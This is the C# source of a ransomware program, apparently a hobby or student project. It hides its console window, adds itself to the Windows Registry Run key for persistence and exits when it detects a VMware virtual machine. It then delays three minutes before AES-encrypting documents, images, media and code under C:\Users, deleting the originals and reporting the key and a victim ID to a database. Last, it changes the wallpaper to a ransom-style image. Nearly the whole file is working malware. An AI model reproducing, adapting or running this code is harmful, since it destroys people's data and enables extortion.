using System;
using System.Security.Cryptography;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Dynamic;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.AccessControl;
using System.Windows.Forms;
using Decryptor;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms.VisualStyles;
using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Drawing;
using Microsoft.Win32;

namespace Encryptor
{
	internal class EncryptorClass
	{
		static List<string> targetExtensions = new List<string>(){".txt", ".jpg", ".png", ".pdf", ".mp4", ".mp3",".c",".py", ".h", ".java",".docx",".pptx"};
		//String key;
		static List<string> foldersBlacklist = new List<string>() { "Windows", "Program Files", "Program Files (x86)", ".pdf", ".mp4" };
		static List<string> toDelete;
		static List<string> toEncrypt;
		const int MINUTES_TO_WAIT = 3;
		
		
		
		//Hiding console prerequsites
		[DllImport("kernel32.dll")]
		static extern IntPtr GetConsoleWindow();
		[DllImport("user32.dll")]
		static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
		const int SW_HIDE = 0;
		
		public static void Main(string[] args)
		{
			hideConsole();
			writeToRegistry();
			checkSysteInfoForVM();
			waitGivenMinutes(MINUTES_TO_WAIT);
			checkDBStatus();

			AesCryptoServiceProvider aes = createCipher();
			encryptAllFiles(aes);		
			
			notifyUser();
		}


		private static void writeToRegistry()
		{
			RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			add.SetValue("WindowsEnc", "\"" + Application.ExecutablePath.ToString() + "\"");

		}
		
		

		private static void encryptAllFiles(AesCryptoServiceProvider aes)
		{
			var watch = System.Diagnostics.Stopwatch.StartNew();
			
			
			string baseDirectory = "C:\\Users";
			//string baseDirectory = "C:\\test";
			toDelete = new List<string>();
			toEncrypt = new List<string>();
			itterate(baseDirectory, aes);
			encryptToEncryptList(aes);
			
			DB.addVictimToDB(aes);
			deleteUnencrypted();
			showAllFiles();
			
						
			watch.Stop();
			var elapsedMs = watch.ElapsedMilliseconds;
			Console.WriteLine("Elapsed Time: "+ elapsedMs + "and in Seconds: "+ (elapsedMs/1000));
		}

		
		
		
		private static void encryptToEncryptList(AesCryptoServiceProvider aes)
		{
			/*
			foreach (var filePath in toEncrypt)
			{
				try
				{
					encryptFile(filePath, aes);

				}
				catch
				{
				}
			}
			*/
			
			Parallel.ForEach(toEncrypt, filePath =>
				{
					try
					{
						encryptFile(filePath, aes);

					}
					catch
					{
					}
				}
			);
			
			
		}



		/// <summary>
		/// waites for a given amound of minutes in 5 second intervals
		/// </summary>
		/// <param name="minutes"></param>
		private static void waitGivenMinutes(int minutes)
		{
			for (int i = 0; i < minutes; i++)
			{
				for (int j = 0; j < 12; j++)
				{
					System.Threading.Thread.Sleep(5000); //sleep for 5 seconds
				}
			}
		}
		
		
		
		
		/// <summary>
		/// runs the SYSTEMINFO command in the terminal and checks if "VMware" appears in the output.
		/// </summary>
		private static void checkSysteInfoForVM()
		{
			ProcessStartInfo procStartInfo =
				new ProcessStartInfo("cmd", "/c " + "SYSTEMINFO");

			// The following commands are needed to redirect the standard output.
			// This means that it will be redirected to the Process.StandardOutput StreamReader.
			procStartInfo.RedirectStandardOutput = true;
			procStartInfo.UseShellExecute = false;
			// Do not create the black window.
			procStartInfo.CreateNoWindow = true;
			// Now we create a process, assign its ProcessStartInfo and start it
			Process proc = new Process();
			proc.StartInfo = procStartInfo;
			proc.Start();
			// Get the output into a string
			string result = proc.StandardOutput.ReadToEnd();
			// Display the command output.
			//Console.WriteLine(result);
			if (result.Contains("VMware"))
			{
				Console.WriteLine("VM Detected");
				Environment.Exit(0);
			}
		}
		
		
		
		
		/// <summary>
		/// This method checks if the user has been attacked before and if he has an insurance then aborts the procecss
		/// also if the files have already been encrypted and he hasent paied yet we dont want to re-encrypt them 
		/// </summary>
		private static void checkDBStatus()
		{
			if (DB.getStatus() == 2)
			{
				string message = "Good news! your isnurance paied off, your computer won't be encrypted again";
				string caption = "Congradulations";
				MessageBox.Show(message, caption,MessageBoxButtons.OK,MessageBoxIcon.Exclamation);
				Environment.Exit(0);
			}
			else if (DB.getStatus() == -1 || DB.getStatus() == 1)
			{				
				Environment.Exit(0);
			}
		}
		
		
		
		
		/// <summary>
		/// Once we are done encrypting it's time to let the user know we are here.
		/// 1. Change wallpaper
		/// 2. Make ID.text
		/// 3. Download Decryptor.exe
		/// </summary>
		private static void notifyUser()
		{
			// Change wallpaper
			Uri wallpaper = new Uri("https://image.ibb.co/kO6xZ6/insane_uriel_by_urielstock_4.jpg");
			Wallpaper.Set(wallpaper,Wallpaper.Style.Fit);
			writeIDFile();
		}


		private static void writeIDFile()
		{
			string path = @"C:\Users\Daniel Ohayon\Desktop\ID.txt";
			if (!File.Exists(path)) 
			{
				// Create a file to write to.
				using (StreamWriter sw = File.CreateText(path)) 
				{
					sw.WriteLine(DB.GetUUID());
				}	
			}

		}
		
		
		
		/// <summary>
		/// This function recives a directpry and a aes key and encrypts
		/// recursivly all of the files in the directory
		/// </summary>
		private static void itterate(string currentDirectory, AesCryptoServiceProvider aes)
		{
			//Directory.SetAccessControl(currentDirectory,new DirectorySecurity().ModifyAccessRule(AccessControlModification.Add,new AccessRule().) );SetAttributes(currentDirectory, FileAttributes.Normal);
			
			try
			{
				var allfiles = Directory.GetFiles(currentDirectory);
				var currentFiles = allfiles.Where(fn => correctTargetExtension(Path.GetExtension(fn)));
				foreach (string filePath in currentFiles)
				{
					try
					{
						//encryptFile(filePath, aes);
						toEncrypt.Add(filePath);
					}
					catch 
					{
						//System.Console.WriteLine("Couldn't Encrypt: " + currentDirectory);
					}
					
				}
				var currentDirectories = Directory.GetDirectories(currentDirectory);
				foreach (string directory in currentDirectories)
				{
					if (!directory.Contains("AppData"))
					{
						itterate(directory, aes);
					}
					
				}


			}
			catch (UnauthorizedAccessException)
			{
				//System.Console.WriteLine("didn't access: " + currentDirectory);
			}

			
		}

		
		
		
		/// <summary>
		/// recives a file and a key and creates another file that has the same content only encrypted and then
		/// deletes the original file
		/// </summary>
		/// <param name="filePath"></param>
		/// <param name="aes"></param>
		private static void encryptFile(string filePath, AesCryptoServiceProvider aes)
		{
			System.Threading.Thread.Sleep(15);
			var buffer = new byte[65536];
			File.SetAttributes(filePath, FileAttributes.Normal);
			//File.SetAttributes(filePath, File.GetAttributes(filePath) | FileAttributes.Hidden);


			using (var streamIn = new FileStream(filePath, FileMode.Open,FileAccess.Read))
			using (var streamOut = new FileStream(filePath + ".enc", FileMode.Create))
			using (var encrypt = new CryptoStream(streamOut, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				File.SetAttributes(filePath + ".enc", File.GetAttributes(filePath + ".enc") | FileAttributes.Hidden);
				
				int bytesRead;
				do
				{
					bytesRead = streamIn.Read(buffer, 0, buffer.Length);
					if (bytesRead != 0)
						encrypt.Write(buffer, 0, bytesRead);
				}
				while (bytesRead != 0);
			}
			toDelete.Add(filePath);
			//System.Console.WriteLine("Encrypted: " + filePath);

		}

		
		
		/// <summary>
		/// Itterates over all of the files that have been encrypted and deletes the original ones.
		/// </summary>
		private static void deleteUnencrypted()
		{
			foreach (var filePath in toDelete)
			{
				try
				{
					System.Threading.Thread.Sleep(6);
					//DEBUG: Console.WriteLine("Now Deleting: " + filePath);
					File.Delete(filePath);
				}
				catch
				{
				}

			}
		}
		
		private static void showAllFiles()
		{
			foreach (var filePath in toEncrypt)
			{
				try
				{
					File.SetAttributes(filePath + ".enc", FileAttributes.Normal);
				}
				catch
				{
				}

			}
		}

		
		

		private static bool correctTargetExtension(string fileExtension){
			return targetExtensions.Exists(e => e == fileExtension);
		}

		
		
		
		/// <summary>
		/// Create the Aes Key
		/// </summary>
		/// <returns>AesCryptoServiceProvider </returns>
		private static AesCryptoServiceProvider createCipher(){
			// Create the key
			var aes = new AesCryptoServiceProvider();
			aes.GenerateKey();
			aes.IV = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };

			/*
			using (var streamOut = new FileStream("c:/test/keyFile.key", FileMode.Create)){
				BinaryWriter bin = new BinaryWriter(streamOut,new System.Text.UTF8Encoding());
				bin.Write(aes.Key, 0, 32);

				bin.Close();
			}
			*/
			return aes;
		}
		
		
		
		
		/// <summary>
		/// Hide the conlsoe inorder t oremain discreate
		/// </summary>
		private static void hideConsole()
		{
			var handle = GetConsoleWindow();
			ShowWindow(handle, SW_HIDE);
		} 
		
		
		
		
		
		
		
		public static void changeDirectoryPermissions(string path){
			System.IO.DirectoryInfo di = new System.IO.DirectoryInfo(path);
			FileSystemAccessRule fsar = new FileSystemAccessRule(path, FileSystemRights.FullControl, AccessControlType.Allow);
			DirectorySecurity ds = null;
			ds = di.GetAccessControl();
			ds.AddAccessRule(fsar);
			di.SetAccessControl(ds); // nothing happens until you do this
		}

	}
	
}